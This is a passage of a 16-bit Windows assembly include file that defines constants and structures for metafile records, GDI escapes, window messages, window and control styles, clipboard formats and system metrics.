META_ESCAPE                =  0626h
META_RESTOREDC             =  0127h
META_FILLREGION            =  0228h
META_FRAMEREGION           =  0429h
META_INVERTREGION          =  012Ah
META_PAINTREGION           =  012Bh
META_SELECTCLIPREGION      =  012Ch
META_SELECTOBJECT          =  012Dh
META_SETTEXTALIGN          =  012Eh
META_DRAWTEXT              =  062Fh

META_CHORD                 =  0830h
META_SETMAPPERFLAGS        =  0231h
META_EXTTEXTOUT            =  0a32h
META_SETDIBTODEV           =  0d33h
META_SELECTPALETTE         =  0234h
META_REALIZEPALETTE        =  0035h
META_ANIMATEPALETTE        =  0436h
META_SETPALENTRIES         =  0037h
META_POLYPOLYGON           =  0538h
META_RESIZEPALETTE         =  0139h

META_DIBBITBLT             =  0940h
META_DIBSTRETCHBLT         =  0b41h
META_DIBCREATEPATTERNBRUSH =  0142h
META_STRETCHDIB            =  0f43h

META_DELETEOBJECT          =  01f0h

META_CREATEPALETTE         =  00f7h
META_CREATEBRUSH           =  00F8h
META_CREATEPATTERNBRUSH    =  01F9h
META_CREATEPENINDIRECT     =  02FAh
META_CREATEFONTINDIRECT    =  02FBh
META_CREATEBRUSHINDIRECT   =  02FCh
META_CREATEBITMAPINDIRECT  =  02FDh
META_CREATEBITMAP          =  06FEh
META_CREATEREGION          =  06FFh

; /* Clipboard Metafile Picture Structure */
HANDLETABLE struc
    ht_objectHandle  dw      ?
HANDLETABLE ends

METARECORD struc
    mr_rdSize        dd      ?
    mr_rdFunction    dw      ?
    mr_rdParm        dw      ?
METARECORD ends

METAFILEPICT struc
    mfp_mm      dw      ?
    mfp_xExt    dw      ?
    mfp_yExt    dw      ?
    mfp_hMF     dw      ?
METAFILEPICT ends

METAHEADER struc
  mtType        dw      ?
  mtHeaderSize  dw      ?
  mtVersion     dw      ?
  mtSize        dd      ?
  mtNoObjects   dw      ?
  mtMaxRecord   dd      ?
  mtNoParameters dw     ?
METAHEADER ends

endif ; NOMETAFILE

; GDI Escapes
NEWFRAME                  =   1
ABORTDOC                  =   2
NEXTBAND                  =   3
SETCOLORTABLE             =   4
GETCOLORTABLE             =   5
FLUSHOUTPUT               =   6
DRAFTMODE                 =   7
QUERYESCSUPPORT           =   8
SETABORTPROC              =   9
STARTDOC                  =   10
;; This value conflicts with a std WIN386 MACRO definition
;;ENDDOC                    =   11
GETPHYSPAGESIZE           =   12
GETPRINTINGOFFSET         =   13
GETSCALINGFACTOR          =   14
MFCOMMENT                 =   15
GETPENWIDTH               =   16
SETCOPYCOUNT              =   17
SELECTPAPERSOURCE         =   18
DEVICEDATA                =   19
PASSTHROUGH               =   19
GETTECHNOLGY              =   20
GETTECHNOLOGY             =   20
SETENDCAP                 =   21
SETLINEJOIN               =   22
SETMITERLIMIT             =   23
BANDINFO                  =   24
DRAWPATTERNRECT           =   25
GETVECTORPENSIZE          =   26
GETVECTORBRUSHSIZE        =   27
ENABLEDUPLEX              =   28
ENABLEMANUALFEED          =   29
GETSETPAPERBINS           =   29
GETSETPRINTORIENT         =   30
ENUMPAPERBINS             =   31

GETEXTENDEDTEXTMETRICS    =   256
GETEXTENTTABLE            =   257
GETPAIRKERNTABLE          =   258
GETTRACKKERNTABLE         =   259

EXTTEXTOUT                =   512

ENABLERELATIVEWIDTHS      =   768
ENABLEPAIRKERNING         =   769
SETKERNTRACK              =   770
SETALLJUSTVALUES          =   771
SETCHARSET                =   772

GETSETSCREENPARAMS        =   3072

STRETCHBLT                =   2048


; Spooler Error Codes
SP_NOTREPORTED            =   4000h
SP_ERROR                  =   (-1)
SP_APPABORT               =   (-2)
SP_USERABORT              =   (-3)
SP_OUTOFDISK              =   (-4)
SP_OUTOFMEMORY            =   (-5)

PR_JOBSTATUS              =   0000

; Object Definitions for EnumObjects()
OBJ_PEN                   =   1
OBJ_BRUSH                 =   2

;
; Menu flags for Change/Check/Enable MenuItem
;
MF_INSERT       =   0000h
MF_CHANGE       =   0080h
MF_APPEND       =   0100h
MF_DELETE       =   0200h
MF_REMOVE       =   1000h

MF_BYCOMMAND    =   0000h
MF_BYPOSITION   =   0400h

MF_SEPARATOR    =   0800h

MF_ENABLED      =   0000h
MF_GRAYED       =   0001h
MF_DISABLED     =   0002h

MF_UNCHECKED    =   0000h
MF_CHECKED      =   0008h
MF_USECHECKBITMAPS= 0200h

MF_STRING       =   0000h
MF_BITMAP       =   0004h
MF_OWNERDRAW    =   0100h

MF_POPUP        =   0010h
MF_MENUBARBREAK =   0020h
MF_MENUBREAK    =   0040h

MF_UNHILITE     =   0000h
MF_HILITE       =   0080h

MF_SYSMENU      =   2000h
MF_HELP         =   4000h
MF_MOUSESELECT  =   8000h


;
;  System Menu Command Values
;
SC_SIZE        = 0F000h
SC_MOVE        = 0F010h
SC_MINIMIZE    = 0F020h
SC_MAXIMIZE    = 0F030h
SC_NEXTWINDOW  = 0F040h
SC_PREVWINDOW  = 0F050h
SC_CLOSE       = 0F060h
SC_VSCROLL     = 0F070h
SC_HSCROLL     = 0F080h
SC_MOUSEMENU   = 0F090h
SC_KEYMENU     = 0F100h
SC_ARRANGE     = 0F110h
SC_RESTORE     = 0F120h
SC_TASKLIST    = 0F130h
SC_SCREENSAVE  = 0F140h
SC_HOTKEY      = 0F150h

SC_ICON        = SC_MINIMIZE
SC_ZOOM        = SC_MAXIMIZE

;
;  Window State Messages
;
IFNDEF  NOWM
WM_STATE            = 0000H

WM_NULL             = 0000h
WM_CREATE           = 0001h
WM_DESTROY          = 0002h
WM_MOVE             = 0003h
WM_SIZE             = 0005h
WM_ACTIVATE         = 0006h
WM_SETFOCUS         = 0007h
WM_KILLFOCUS        = 0008h
WM_ENABLE           = 000Ah
WM_SETREDRAW        = 000Bh
WM_SETTEXT          = 000Ch
WM_GETTEXT          = 000Dh
WM_GETTEXTLENGTH    = 000Eh
WM_PAINT            = 000Fh
WM_CLOSE            = 0010h
WM_QUERYENDSESSION  = 0011h
WM_QUIT             = 0012h
WM_QUERYOPEN        = 0013h
WM_ERASEBKGND       = 0014h
WM_SYSCOLORCHANGE   = 0015h
WM_ENDSESSION       = 0016h
WM_SYSTEMERROR      = 0017h
WM_SHOWWINDOW       = 0018h
WM_CTLCOLOR         = 0019h
WM_WININICHANGE     = 001Ah
WM_DEVMODECHANGE    = 001Bh
WM_ACTIVATEAPP      = 001Ch
WM_FONTCHANGE       = 001Dh
WM_TIMECHANGE       = 001Eh
WM_CANCELMODE       = 001Fh
WM_SETCURSOR        = 0020h
WM_MOUSEACTIVATE    = 0021h
WM_CHILDACTIVATE    = 0022h
WM_QUEUESYNC        = 0023h
WM_GETMINMAXINFO    = 0024h
WM_PAINTICON        = 0026h
WM_ICONERASEBKGND   = 0027h
WM_NEXTDLGCTL       = 0028h
WM_SPOOLERSTATUS    = 002Ah
WM_DRAWITEM         = 002Bh
WM_MEASUREITEM      = 002Ch
WM_DELETEITEM       = 002Dh
WM_VKEYTOITEM       = 002Eh
WM_CHARTOITEM       = 002Fh
WM_SETFONT          = 0030h
WM_GETFONT          = 0031h
WM_QUERYDRAGICON    = 0037h
WM_COMPAREITEM      = 0039h
WM_COMPACTING       = 0041h
IFNDEF NOWIN31
WM_COMMNOTIFY       = 0044h
WM_WINDOWPOSCHANGING= 0046h
WM_WINDOWPOSCHANGED = 0047h
WM_POWER            = 0048h
ENDIF


WM_NCCREATE         = 0081h
WM_NCDESTROY        = 0082h
WM_NCCALCSIZE       = 0083h
WM_NCHITTEST        = 0084h
WM_NCPAINT          = 0085h
WM_NCACTIVATE       = 0086h
WM_GETDLGCODE       = 0087h
WM_NCMOUSEMOVE      = 00A0h
WM_NCLBUTTONDOWN    = 00A1h
WM_NCLBUTTONUP      = 00A2h
WM_NCLBUTTONDBLCLK  = 00A3h
WM_NCRBUTTONDOWN    = 00A4h
WM_NCRBUTTONUP      = 00A5h
WM_NCRBUTTONDBLCLK  = 00A6h
WM_NCMBUTTONDOWN    = 00A7h
WM_NCMBUTTONUP      = 00A8h
WM_NCMBUTTONDBLCLK  = 00A9h

WM_KEYFIRST         = 0100h
WM_KEYDOWN          = 0100h
WM_KEYUP            = 0101h
WM_CHAR             = 0102h
WM_DEADCHAR         = 0103h
WM_SYSKEYDOWN       = 0104h
WM_SYSKEYUP         = 0105h
WM_SYSCHAR          = 0106h
WM_SYSDEADCHAR      = 0107h
WM_KEYLAST          = 0108h

WM_INITDIALOG       = 0110h
WM_COMMAND          = 0111h
WM_SYSCOMMAND       = 0112h
WM_TIMER            = 0113h
WM_HSCROLL          = 0114h
WM_VSCROLL          = 0115h
WM_INITMENU         = 0116h
WM_INITMENUPOPUP    = 0117h
WM_MENUSELECT       = 011Fh
WM_MENUCHAR         = 0120h
WM_ENTERIDLE        = 0121h


WM_MOUSEFIRST       = 0200h
WM_MOUSEMOVE        = 0200h
WM_LBUTTONDOWN      = 0201h
WM_LBUTTONUP        = 0202h
WM_LBUTTONDBLCLK    = 0203h
WM_RBUTTONDOWN      = 0204h
WM_RBUTTONUP        = 0205h
WM_RBUTTONDBLCLK    = 0206h
WM_MBUTTONDOWN      = 0207h
WM_MBUTTONUP        = 0208h
WM_MBUTTONDBLCLK    = 0209h
WM_MOUSELAST        = 0209h

WM_PARENTNOTIFY     = 0210h
WM_MDICREATE        = 0220h
WM_MDIDESTROY       = 0221h
WM_MDIACTIVATE      = 0222h
WM_MDIRESTORE       = 0223h
WM_MDINEXT          = 0224h
WM_MDIMAXIMIZE      = 0225h
WM_MDITILE          = 0226h
WM_MDICASCADE       = 0227h
WM_MDIICONARRANGE   = 0228h
WM_MDIGETACTIVE     = 0229h
WM_MDISETMENU       = 0230h
WM_DROPFILES        = 0233h


WM_CUT              = 0300h
WM_COPY             = 0301h
WM_PASTE            = 0302h
WM_CLEAR            = 0303h
WM_UNDO             = 0304h
WM_RENDERFORMAT     = 0305h
WM_RENDERALLFORMATS = 0306h
WM_DESTROYCLIPBOARD = 0307h
WM_DRAWCLIPBOARD    = 0308h
WM_PAINTCLIPBOARD   = 0309h
WM_VSCROLLCLIPBOARD = 030Ah
WM_SIZECLIPBOARD    = 030Bh
WM_ASKCBFORMATNAME  = 030Ch
WM_CHANGECBCHAIN    = 030Dh
WM_HSCROLLCLIPBOARD = 030Eh
WM_QUERYNEWPALETTE  = 030Fh
WM_PALETTEISCHANGING = 0310h
WM_PALETTECHANGED   = 0311h

IFNDEF NOWIN31
WM_PENWINFIRST      equ 0380h
WM_PENWINLAST       equ 038Fh


WM_COALESCE_FIRST  equ 0390h
WM_COALESCE_LAST   equ 039Fh




ENDIF



;  private window messages start here
WM_USER             = 0400H
ENDIF           ; NOWM

; WM_MOUSEACTIVATE Return Codes
MA_ACTIVATE       =  1
MA_ACTIVATEANDEAT =  2
MA_NOACTIVATE     =  3

; Size message commands
SIZENORMAL       = 0
SIZEICONIC       = 1
SIZEFULLSCREEN   = 2
SIZEZOOMSHOW     = 3
SIZEZOOMHIDE     = 4

; ShowWindow() Commands
SW_HIDE            = 0
SW_SHOWNORMAL      = 1
SW_NORMAL          = 1
SW_SHOWMINIMIZED   = 2
SW_SHOWMAXIMIZED   = 3
SW_MAXIMIZE        = 3
SW_SHOWNOACTIVATE  = 4
SW_SHOW            = 5
SW_MINIMIZE        = 6
SW_SHOWMINNOACTIVE = 7
SW_SHOWNA          = 8
SW_RESTORE         = 9

; Old ShowWindow() Commands
HIDE_WINDOW        = 0
SHOW_OPENWINDOW    = 1
SHOW_ICONWINDOW    = 2
SHOW_FULLSCREEN    = 3
SHOW_OPENNOACTIVATE= 4

;  identifiers for the WM_SHOWWINDOW message
SW_PARENTCLOSING =  1
SW_OTHERZOOM     =  2
SW_PARENTOPENING =  3
SW_OTHERUNZOOM   =  4
;
; Key state masks for mouse messages
;
MK_LBUTTON       = 0001h
MK_RBUTTON       = 0002h
MK_SHIFT         = 0004h
MK_CONTROL       = 0008h
MK_MBUTTON       = 0010h
;
; Class styles
;
CS_VREDRAW         = 0001h
CS_HREDRAW         = 0002h
CS_KEYCVTWINDOW    = 0004H
CS_DBLCLKS         = 0008h
;                    0010h reserved
CS_OWNDC           = 0020h
CS_CLASSDC         = 0040h
CS_PARENTDC        = 0080h
CS_NOKEYCVT        = 0100h
CS_SAVEBITS        = 0800h
CS_NOCLOSE         = 0200h
CS_BYTEALIGNCLIENT = 1000h
CS_BYTEALIGNWINDOW = 2000h
CS_GLOBALCLASS     = 4000h    ; Global window class

;
; Special CreateWindow position value
;
CW_USEDEFAULT   EQU    8000h

;
; Windows styles (the high words)
;
WS_OVERLAPPED   = 00000h
WS_ICONICPOPUP  = 0C000h
WS_POPUP        = 08000h
WS_CHILD        = 04000h
WS_MINIMIZE     = 02000h
WS_VISIBLE      = 01000h
WS_DISABLED     = 00800h
WS_CLIPSIBLINGS = 00400h
WS_CLIPCHILDREN = 00200h
WS_MAXIMIZE     = 00100h
WS_CAPTION      = 000C0h     ; WS_BORDER | WS_DLGFRAME
WS_BORDER       = 00080h
WS_DLGFRAME     = 00040h
WS_VSCROLL      = 00020h
WS_HSCROLL      = 00010h
WS_SYSMENU      = 00008h
WS_THICKFRAME   = 00004h
WS_HREDRAW      = 00002h
WS_VREDRAW      = 00001h
WS_GROUP        = 00002h
WS_TABSTOP      = 00001h
WS_MINIMIZEBOX  = 00002h
WS_MAXIMIZEBOX  = 00001h

; Common Window Styles

WS_OVERLAPPEDWINDOW = WS_OVERLAPPED + WS_CAPTION + WS_SYSMENU + WS_THICKFRAME + WS_MINIMIZEBOX + WS_MAXIMIZEBOX
WS_POPUPWINDOW  = WS_POPUP + WS_BORDER + WS_SYSMENU
WS_CHILDWINDOW  = WS_CHILD
WS_TILEDWINDOW  = WS_OVERLAPPEDWINDOW

WS_TILED        = WS_OVERLAPPED
WS_ICONIC       = WS_MINIMIZE
WS_SIZEBOX      = WS_THICKFRAME

; Extended Window Styles (low words)
WS_EX_DLGMODALFRAME  = 0001
WS_EX_DRAGOBJECT     = 0002
WS_EX_NOPARENTNOTIFY = 0004
WS_EX_TOPMOST        = 0008

;
; predefined clipboard formats
;
CF_TEXT         =  1
CF_BITMAP       =  2
CF_METAFILEPICT =  3
CF_SYLK         =  4
CF_DIF          =  5
CF_TIFF         =  6
CF_OEMTEXT      =  7
CF_DIB          =  8
CF_PALETTE      =  9
CF_PENDATA      = 10
CF_RIFF         = 11
CF_WAVE         = 12

CF_OWNERDISPLAY = 80h       ; owner display
CF_DSPTEXT      = 81h       ; display text
CF_DSPBITMAP    = 82h       ; display bitmap
CF_DSPMETAFILEPICT  = 83h   ; display metafile
;
; Private clipboard format range
;
CF_PRIVATEFIRST       = 200h       ; Anything in this range doesn't
CF_PRIVATELAST        = 2ffh       ; get GlobalFree'd
CF_GDIOBJFIRST        = 300h       ; Anything in this range gets
CF_GDIOBJLAST         = 3ffh       ; DeleteObject'ed


MAKEINTRESOURCE MACRO a
        mov     ax,a
        xor     dx,dx
        ENDM
;
;  Predefined resource types
;
RT_CURSOR       = 1              ; must be passed through MAKEINTRESOURCE
RT_BITMAP       = 2
RT_ICON         = 3
RT_MENU         = 4
RT_DIALOG       = 5
RT_STRING       = 6
RT_FONTDIR      = 7
RT_FONT         = 8
RT_ACCELERATOR  = 9
RT_RCDATA       = 10

;** NOTE: if any new resource types are introduced above this point, then the
;** value of DIFFERENCE must be changed.
;** (RT_GROUP_CURSOR - RT_CURSOR) must always be equal to DIFFERENCE
;** (RT_GROUP_ICON - RT_ICON) must always be equal to DIFFERENCE

DIFFERENCE       =   11

RT_GROUP_CURSOR  =   RT_CURSOR + DIFFERENCE
RT_GROUP_ICON    =   RT_ICON + DIFFERENCE



IFNDEF NOMDI
MDICREATESTRUCT     struc
    szClass         dd ?
    szTitle         dd ?
    hOwner          dw ?
    x               dw ?
    y               dw ?
    cxc             dw ?
    cyc             dw ?
    style           dd ?
MDICREATESTRUCT ends

CLIENTCREATESTRUCT  struc
    hWindowMenu     dw ?
    idFirstChild    dw ?
CLIENTCREATESTRUCT ends
ENDIF

; NOMDI


PALETTEENTRY        struc
    peRed           db ?
    peGreen         db ?
    peBlue          db ?
    peFlags         db ?
PALETTEENTRY        ends

; Logical Palette
LOGPALETTE          struc
    palVersion      dw ?
    palNumEntries   dw ?
    palPalEntry     db ?  ; array of PALETTEENTRY
LOGPALETTE          ends

; DRAWITEMSTRUCT for ownerdraw
DRAWITEMSTRUCT      struc
    drCtlType         dw ?
    drCtlID           dw ?
    dritemID          dw ?
    dritemAction      dw ?
    dritemState       dw ?
    drhwndItem        dw ?
    drhDC             dw ?
    drrcItem          DB size RECT dup(?)
    dritemData        dd ?
DRAWITEMSTRUCT ends

; DELETEITEMSTRUCT for ownerdraw
DELETEITEMSTRUCT    struc
    deCtlType         dw ?
    deCtlID           dw ?
    deitemID          dw ?
    dehwndItem        dw ?
    deitemData        dd ?
DELETEITEMSTRUCT ends

; MEASUREITEMSTRUCT for ownerdraw
MEASUREITEMSTRUCT   struc
    meCtlType         dw ?
    meCtlID           dw ?
    meitemID          dw ?
    meitemWidth       dw ?
    meitemHeight      dw ?
    meitemData        dd ?
MEASUREITEMSTRUCT ends

; COMPAREITEMSTUCT for ownerdraw sorting
COMPAREITEMSTRUCT   struc
    coCtlType   dw ?
    coCtlID     dw ?
    cohwndItem  dw ?
    coitemID1   dw ?
    coitemData1 dd ?
    coitemID2   dw ?
    coitemData2 dd ?
COMPAREITEMSTRUCT   ends

; Owner draw control types
ODT_MENU      =  1
ODT_LISTBOX   =  2
ODT_COMBOBOX  =  3
ODT_BUTTON    =  4

; Owner draw actions
ODA_DRAWENTIRE = 1
ODA_SELECT     = 2
ODA_FOCUS      = 4

; Owner draw state
ODS_SELECTED   = 0001h
ODS_GRAYED     = 0002h
ODS_DISABLED   = 0004h
ODS_CHECKED    = 0008h
ODS_FOCUS      = 0010h

; PeekMessage() Options
PM_NOREMOVE    = 0000h
PM_REMOVE      = 0001h
PM_NOYIELD     = 0002h

; SetWindowPos Flags
SWP_NOSIZE       =  0001h
SWP_NOMOVE       =  0002h
SWP_NOZORDER     =  0004h
SWP_NOREDRAW     =  0008h
SWP_NOACTIVATE   =  0010h
SWP_DRAWFRAME    =  0020h
SWP_SHOWWINDOW   =  0040h
SWP_HIDEWINDOW   =  0080h
SWP_NOCOPYBITS   =  0100h
SWP_NOREPOSITION =  0200h


IFNDEF NOWINMESSAGES

; Listbox messages
LB_ADDSTRING           = (WM_USER+1)
LB_INSERTSTRING        = (WM_USER+2)
LB_DELETESTRING        = (WM_USER+3)
LB_RESETCONTENT        = (WM_USER+5)
LB_SETSEL              = (WM_USER+6)
LB_SETCURSEL           = (WM_USER+7)
LB_GETSEL              = (WM_USER+8)
LB_GETCURSEL           = (WM_USER+9)
LB_GETTEXT             = (WM_USER+10)
LB_GETTEXTLEN          = (WM_USER+11)
LB_GETCOUNT            = (WM_USER+12)
LB_SELECTSTRING        = (WM_USER+13)
LB_DIR                 = (WM_USER+14)
LB_GETTOPINDEX         = (WM_USER+15)
LB_FINDSTRING          = (WM_USER+16)
LB_GETSELCOUNT         = (WM_USER+17)
LB_GETSELITEMS         = (WM_USER+18)
LB_SETTABSTOPS         = (WM_USER+19)
LB_GETHORIZONTALEXTENT = (WM_USER+20)
LB_SETHORIZONTALEXTENT = (WM_USER+21)
LB_SETTOPINDEX         = (WM_USER+24)
LB_GETITEMRECT         = (WM_USER+25)
LB_GETITEMDATA         = (WM_USER+26)
LB_SETITEMDATA         = (WM_USER+27)
LB_SELITEMRANGE        = (WM_USER+28)
LB_SETCARETINDEX       = (WM_USER+31)
LB_GETCARETINDEX       = (WM_USER+32)
IFNDEF NOWIN31
LB_SETITEMHEIGHT       = (WM_USER+33)
LB_GETITEMHEIGHT       = (WM_USER+34)
LB_FINDSTRINGEXACT     = (WM_USER+35)
ENDIF

ENDIF
; NOWINMESSAGES

; Listbox Styles
LBS_NOTIFY            = 0001h
LBS_SORT              = 0002h
LBS_NOREDRAW          = 0004h
LBS_MULTIPLESEL       = 0008h
LBS_OWNERDRAWFIXED    = 0010h
LBS_OWNERDRAWVARIABLE = 0020h
LBS_HASSTRINGS        = 0040h
LBS_USETABSTOPS       = 0080h
LBS_NOINTEGRALHEIGHT  = 0100h
LBS_MULTICOLUMN       = 0200h
LBS_WANTKEYBOARDINPUT = 0400h
LBS_EXTENDEDSEL       = 0800h
LBS_STANDARD          = LBS_NOTIFY + LBS_SORT + WS_VSCROLL + WS_BORDER
LBS_DISABLENOSCROLL   = 1000h

; Listbox Notification Codes
LBN_ERRSPACE      =  (-2)
LBN_SELCHANGE     =  1
LBN_DBLCLK        =  2
LBN_SELCANCEL     =  3
LBN_SETFOCUS      =  4
LBN_KILLFOCUS     =  5

IFNDEF NOWINMESSAGES

; Edit Control Messages
EM_GETSEL              = (WM_USER+0)
EM_SETSEL              = (WM_USER+1)
EM_GETRECT             = (WM_USER+2)
EM_SETRECT             = (WM_USER+3)
EM_SETRECTNP           = (WM_USER+4)
EM_SCROLL              = (WM_USER+5)
EM_LINESCROLL          = (WM_USER+6)
EM_GETMODIFY           = (WM_USER+8)
EM_SETMODIFY           = (WM_USER+9)
EM_GETLINECOUNT        = (WM_USER+10)
EM_LINEINDEX           = (WM_USER+11)
EM_SETHANDLE           = (WM_USER+12)
EM_GETHANDLE           = (WM_USER+13)
EM_LINELENGTH          = (WM_USER+17)
EM_REPLACESEL          = (WM_USER+18)
EM_SETFONT             = (WM_USER+19)
EM_GETLINE             = (WM_USER+20)
EM_LIMITTEXT           = (WM_USER+21)
EM_CANUNDO             = (WM_USER+22)
EM_UNDO                = (WM_USER+23)
EM_FMTLINES            = (WM_USER+24)
EM_LINEFROMCHAR        = (WM_USER+25)
EM_SETWORDBREAK        = (WM_USER+26)
EM_SETTABSTOPS         = (WM_USER+27)
EM_SETPASSWORDCHAR     = (WM_USER+28)
EM_EMPTYUNDOBUFFER     = (WM_USER+29)
IFNDEF NOWIN31
EM_GETFIRSTVISIBLELINE = (WM_USER+30)
EM_SETREADONLY         = (WM_USER+31)
EM_SETWORDBREAKPROC    = (WM_USER+32)
EM_GETWORDBREAKPROC    = (WM_USER+33)
EM_GETPASSWORDCHAR     = (WM_USER+34)
ENDIF

ENDIF
; NOWINMESSAGES


; Edit Control Styles (low word)
ES_LEFT            = 0000h
ES_CENTER          = 0001h
ES_RIGHT           = 0002h
ES_MULTILINE       = 0004h
ES_UPPERCASE       = 0008h
ES_LOWERCASE       = 0010h
ES_PASSWORD        = 0020h
ES_AUTOVSCROLL     = 0040h
ES_AUTOHSCROLL     = 0080h
ES_NOHIDESEL       = 0100h
ES_OEMCONVERT      = 0400h
IFNDEF NOWIN31
ES_READONLY        = 0800h
ES_WANTRETURN      = 1000h
ENDIF


; Edit Control Notification Codes
EN_SETFOCUS        = 0100h
EN_KILLFOCUS       = 0200h
EN_CHANGE          = 0300h
EN_UPDATE          = 0400h
EN_ERRSPACE        = 0500h
EN_MAXTEXT         = 0501h
EN_HSCROLL         = 0601h
EN_VSCROLL         = 0602h

IFNDEF NOWINMESSAGES

; Button Control Messages
BM_GETCHECK        = (WM_USER+0)
BM_SETCHECK        = (WM_USER+1)
BM_GETSTATE        = (WM_USER+2)
BM_SETSTATE        = (WM_USER+3)
BM_SETSTYLE        = (WM_USER+4)

ENDIF
; NOWINMESSAGES

; Button Control Styles (low word)
BS_PUSHBUTTON      = 00h
BS_DEFPUSHBUTTON   = 01h
BS_CHECKBOX        = 02h
BS_AUTOCHECKBOX    = 03h
BS_RADIOBUTTON     = 04h
BS_3STATE          = 05h
BS_AUTO3STATE      = 06h
BS_GROUPBOX        = 07h
BS_USERBUTTON      = 08h
BS_AUTORADIOBUTTON = 09h
BS_OWNERDRAW       = 0Bh
BS_LEFTTEXT        = 20h

; User Button Notification Codes
BN_CLICKED         = 0
BN_PAINT           = 1
BN_HILITE          = 2
BN_UNHILITE        = 3
BN_DISABLE         = 4
BN_DOUBLECLICKED   = 5

; Dialog Styles (low words)
DS_ABSALIGN        = 01h
DS_SYSMODAL        = 02h
DS_LOCALEDIT       = 20h  ;/* Edit items get Local storage. */
DS_SETFONT         = 40h  ;/* User specified font for Dlg controls */
DS_MODALFRAME      = 80h  ;/* Can be combined with WS_CAPTION  */
DS_NOIDLEMSG       = 100h ;/* WM_ENTERIDLE message will not be sent */

IFNDEF NOWINMESSAGES

; Dialog box messages
DM_GETDEFID        = (WM_USER+0)
DM_SETDEFID        = (WM_USER+1)

ENDIF   ;NOWINMESSAGES

; Dialog Codes
DLGC_WANTARROWS     = 0001h    ;  /* Control wants arrow keys         */
DLGC_WANTTAB        = 0002h    ;  /* Control wants tab keys           */
DLGC_WANTALLKEYS    = 0004h    ;  /* Control wants all keys           */
DLGC_WANTMESSAGE    = 0004h    ;  /* Pass message to control          */
DLGC_HASSETSEL      = 0008h    ;  /* Understands EM_SETSEL message    */
DLGC_DEFPUSHBUTTON  = 0010h    ;  /* Default pushbutton               */
DLGC_UNDEFPUSHBUTTON= 0020h    ;  /* Non-default pushbutton           */
DLGC_RADIOBUTTON    = 0040h    ;  /* Radio button                     */
DLGC_WANTCHARS      = 0080h    ;  /* Want WM_CHAR messages            */
DLGC_STATIC         = 0100h    ;  /* Static item: don't include       */
DLGC_BUTTON         = 2000h    ;  /* Button item: can be checked      */

; Combo Box return Values
CB_OKAY          =   0
CB_ERR           =   (-1)
CB_ERRSPACE      =   (-2)

; Combo Box Notification Codes
CBN_ERRSPACE     =   (-1)
CBN_SELCHANGE    =   1
CBN_DBLCLK       =   2
CBN_SETFOCUS     =   3
CBN_KILLFOCUS    =   4
CBN_EDITCHANGE   =   5
CBN_EDITUPDATE   =   6
CBN_DROPDOWN     =   7

; Combo Box styles (low words)
CBS_SIMPLE           = 0001h
CBS_DROPDOWN         = 0002h
CBS_DROPDOWNLIST     = 0003h
CBS_OWNERDRAWFIXED   = 0010h
CBS_OWNERDRAWVARIABLE= 0020h
CBS_AUTOHSCROLL      = 0040h
CBS_OEMCONVERT       = 0080h
CBS_SORT             = 0100h
CBS_HASSTRINGS       = 0200h
CBS_NOINTEGRALHEIGHT = 0400h

IFNDEF NOWINMESSAGES

; Combo Box messages
CB_GETEDITSEL            = (WM_USER+0)
CB_LIMITTEXT             = (WM_USER+1)
CB_SETEDITSEL            = (WM_USER+2)
CB_ADDSTRING             = (WM_USER+3)
CB_DELETESTRING          = (WM_USER+4)
CB_DIR                   = (WM_USER+5)
CB_GETCOUNT              = (WM_USER+6)
CB_GETCURSEL             = (WM_USER+7)
CB_GETLBTEXT             = (WM_USER+8)
CB_GETLBTEXTLEN          = (WM_USER+9)
CB_INSERTSTRING          = (WM_USER+10)
CB_RESETCONTENT          = (WM_USER+11)
CB_FINDSTRING            = (WM_USER+12)
CB_SELECTSTRING          = (WM_USER+13)
CB_SETCURSEL             = (WM_USER+14)
CB_SHOWDROPDOWN          = (WM_USER+15)
CB_GETITEMDATA           = (WM_USER+16)
CB_SETITEMDATA           = (WM_USER+17)
IFNDEF NOWIN31
CB_GETDROPPEDCONTROLRECT = (WM_USER+18)
CB_SETITEMHEIGHT         = (WM_USER+19)
CB_GETITEMHEIGHT         = (WM_USER+20)
CB_SETEXTENDEDUI         = (WM_USER+21)
CB_GETEXTENDEDUI         = (WM_USER+22)
CB_GETDROPPEDSTATE       = (WM_USER+23)
CB_FINDSTRINGEXACT       = (WM_USER+24)
ENDIF

ENDIF ; NOWINMESSAGES

; Static Control styles (low word)
SS_LEFT            = 00h
SS_CENTER          = 01h
SS_RIGHT           = 02h
SS_ICON            = 03h
SS_BLACKRECT       = 04h
SS_GRAYRECT        = 05h
SS_WHITERECT       = 06h
SS_BLACKFRAME      = 07h
SS_GRAYFRAME       = 08h
SS_WHITEFRAME      = 09h
SS_SIMPLE          = 0Bh
SS_LEFTNOWORDWRAP  = 0Ch
SS_NOPREFIX        = 80h    ; Don't do "&" character translation

IFNDEF NOWIN31
IFNDEF NOWINMESSAGES

;Static Control Messages
STM_SETICON        = (WM_USER+0)
STM_GETICON        = (WM_USER+1)
ENDIF
ENDIF

; Scroll Bar Styles (low word)
SBS_HORZ                    = 0000h
SBS_VERT                    = 0001h
SBS_TOPALIGN                = 0002h
SBS_LEFTALIGN               = 0002h
SBS_BOTTOMALIGN             = 0004h
SBS_RIGHTALIGN              = 0004h
SBS_SIZEBOXTOPLEFTALIGN     = 0002h
SBS_SIZEBOXBOTTOMRIGHTALIGN = 0004h
SBS_SIZEBOX                 = 0008h

IFNDEF NOSYSMETRICS

; GetSystemMetrics() codes
SM_CXSCREEN           =  0
SM_CYSCREEN           =  1
SM_CXVSCROLL          =  2
SM_CYHSCROLL          =  3
SM_CYCAPTION          =  4
SM_CXBORDER           =  5
SM_CYBORDER           =  6
SM_CXDLGFRAME         =  7
SM_CYDLGFRAME         =  8
SM_CYVTHUMB           =  9
SM_CXHTHUMB           =  10
SM_CXICON             =  11
SM_CYICON             =  12
SM_CXCURSOR           =  13
SM_CYCURSOR           =  14
SM_CYMENU             =  15
SM_CXFULLSCREEN       =  16
SM_CYFULLSCREEN       =  17
SM_CYKANJIWINDOW      =  18
SM_MOUSEPRESENT       =  19
SM_CYVSCROLL          =  20
SM_CXHSCROLL          =  21
SM_DEBUG              =  22
SM_SWAPBUTTON         =  23
SM_RESERVED1          =  24
SM_RESERVED2          =  25
SM_RESERVED3          =  26
SM_RESERVED4          =  27
SM_CXMIN              =  28
SM_CYMIN              =  29
SM_CXSIZE             =  30
SM_CYSIZE             =  31
SM_CXFRAME            =  32
SM_CYFRAME            =  33
SM_CXMINTRACK         =  34
SM_CYMINTRACK         =  35
IFNDEF NOWIN31
SM_CXDOUBLECLK        =  36
SM_CYDOUBLECLK        =  37
SM_CXICONSPACING      =  38
SM_CYICONSPACING      =  39
SM_MENUDROPALIGNMENT  =  40
